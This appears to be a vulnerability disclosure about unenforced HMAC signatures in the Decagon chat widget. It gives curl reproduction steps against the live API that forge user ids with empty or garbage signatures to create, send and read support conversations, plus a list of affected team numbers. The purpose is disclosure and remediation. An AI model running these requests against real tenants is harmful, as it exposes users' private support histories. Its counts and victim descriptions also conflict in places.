# DecaForge: Decagon chat-widget HMAC signature unenforced on 29 of 94 tenant teams — read and write any user's support history

Class: improper verification of cryptographic signature (CWE-347) · Severity
High, CVSS 8.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` · Tested
2026-08-22 against `api.decagon.ai`, backend build
`_decagon_git_commit_sha: ad4fdb545325e1d052a5e4c7524466ea38c25dd1`

## Abstract

The Decagon web chat widget identifies the visitor with four client headers:
`X-DECAGON-AUTH-USER-ID` carries the id and `X-DECAGON-AUTH-SIGNATURE`
carries an HMAC over it. On 29 of the 94 live tenant teams swept, the
signature is not enforced: the API accepts any user id with the signature
empty, garbage, or absent, and serves that id's conversation list and full
message history. The backend already evaluates the signature and reports the
result in-band (`_decagon_has_valid_signature: false` in the response body)
— the omission is visible on every affected response. The same request
returns 401 on enforcing teams: Notion (team 31), Coinbase (63), Strava
(128). This is a per-tenant configuration gap across the fleet, not one
global hole.

The forged user id is the credential. Listing, history, and new-thread
writes are scoped to the asserted id (cross-identity conversation access
404s), so the capability is exactly: assert a victim's user id, read their
support history, and open threads attributed to them.

## Reproduction (team 29, the replit deployment)

Every request carries:

```text
X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a
X-DECAGON-AUTH-TEAM-ID: 29
X-DECAGON-AUTH-SIGNATURE: (empty)
X-DECAGON-AUTH-EPOCH: (empty)
```

1. Create a conversation:

```bash
curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
    -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " -H "X-DECAGON-AUTH-EPOCH: " \
    -H "Content-Type: application/json" \
    -d '{"flow_id":"replit","metadata":{"widget_location":"https://decagon.ai/"}}' \
    https://api.decagon.ai/conversation/new
# {"conversation_id":"c71b62e4-a545-4044-883e-b0d6e18899ac"}
```

2. Send a message into it:

```bash
curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
    -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " -H "X-DECAGON-AUTH-EPOCH: " \
    -H "Content-Type: application/json" \
    -d '{"type":"chat_message","text":"canary message for e2e proof","flow_id":"replit"}' \
    https://api.decagon.ai/chat/c71b62e4-a545-4044-883e-b0d6e18899ac/message
# {"message":"Message received"}  (202)
```

3. Read the list back with the same empty signature:

```bash
curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
    -H "X-DECAGON-AUTH-TEAM-ID: 29" -H "X-DECAGON-AUTH-SIGNATURE: " \
    https://api.decagon.ai/conversation/user
# {"conversations":[{"id":"c71b62e4-…","text":"canary message for e2e proof",…}]}
```

4. Read the history with a garbage signature — 64 hex characters that are an
HMAC of nothing:

```bash
curl -s -H "X-DECAGON-AUTH-USER-ID: bastion-e2e-canary-a" \
    -H "X-DECAGON-AUTH-TEAM-ID: 29" \
    -H "X-DECAGON-AUTH-SIGNATURE: deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" \
    -H "X-DECAGON-AUTH-EPOCH: 1" \
    "https://api.decagon.ai/conversation/history?conversation_id=c71b62e4-a545-4044-883e-b0d6e18899ac"
```

The response serves the messages **and** carries the backend's own verdict:

```json
"metadata": {"_decagon_git_commit_sha":"ad4fdb54…", "_decagon_has_valid_signature": false}
```

Omitting the signature header entirely also returns the history.

## Scope controls that DO hold

A second canary id (`bastion-e2e-canary-b`) gets an empty list at step 3 and
`{"detail":"Conversation not found"}` at step 4 against the same conversation
id; sending into that conversation as B also 404s and the message does not
land. The forged id is the credential — there is no cross-id object access.

## Affected teams

`GET /conversation/user` with a named id and an empty signature returned 200
on these teams out of 130 swept (94 live):

```text
1 2 7 8 9 10 11 13 15 20 28 29 32 33 34 36 39 40 44 46 50 51 53 55 56 58 73
```

Team 29 was identified as the replit deployment by offering candidate flow
ids to `conversation/new` — only `replit` was accepted there and rejected on
every other team, so flow ids are team-scoped and the match is exact. An
independent verifier re-ran the whole chain with fresh ids and matched every
step, including the omitted-signature read.

## Re-verification (2026-08-22, post-report)

- The named victims from the original repro — Notion (31), Coinbase (63),
  Strava (128) — now ENFORCE: `{"detail":"Invalid signature."}` HTTP 401
  with empty and garbage signatures. Remediated between the original repro
  and the re-check.
- 12 of 31 sampled live teams STILL accept a named forged user id with an
  empty signature (teams 1, 2, 7, 8, 9, 10, 11, 13, 15, 20, 40, 50).
- The anonymous lane (`decagon_anonymous_*` ids) is unsigned BY DESIGN on
  every live team.
- Object-level scoping held throughout (WS subscribe with a foreign identity
  → `Auth verification failed`).

## Impact

Anyone who knows or guesses a user id on an affected team reads that id's
support conversation list and full message history, and can open new threads
and send messages attributed to that id. The user id is the identifier the
customer's site passes to the widget, so its guessability is set by each
customer's integration — for many widgets it is a sequential or
email-derived value.

## Fix

Reject named ids whose signature is absent or invalid, on all teams. The
check already runs and the result is already computed on every request —
gate the read and write paths on `_decagon_has_valid_signature` instead of
recording it in the response body. The flag and the git sha in the response
metadata are themselves worth removing.

## Credit

nichoc0
